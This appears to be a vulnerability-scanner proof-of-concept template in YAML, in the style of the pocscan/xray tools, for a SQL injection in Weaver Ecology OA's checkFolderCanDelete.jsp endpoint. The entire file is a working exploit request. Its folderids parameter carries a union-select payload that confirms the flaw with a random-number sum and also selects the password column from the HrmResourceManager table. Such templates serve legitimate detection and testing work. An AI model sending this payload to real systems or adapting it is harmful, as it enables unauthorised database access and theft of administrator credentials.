name: poc-yaml-ecology-checkfoldercandelete-sqli
binding: 6a1e46ca-75f9-4d97-bbc0-47a19fd38e44
manual: true
detail:
    author: y0y0
    links:
        - https://github.com/DSO-Lab/pocscan/blob/main/README.md
    vulnerability:
        level: high
transport: http
set:
    rInt1: randomInt(800000000, 1000000000)
    rInt2: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /docs/networkdisk/checkFolderCanDelete.jsp?folderids=-1))union(select({{rInt1}}%2B{{rInt2}}),password+from+HrmResourceManager+where(0=0
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(string(rInt1 + rInt2)) && response.content_type.contains("application/json")
expression: r0()
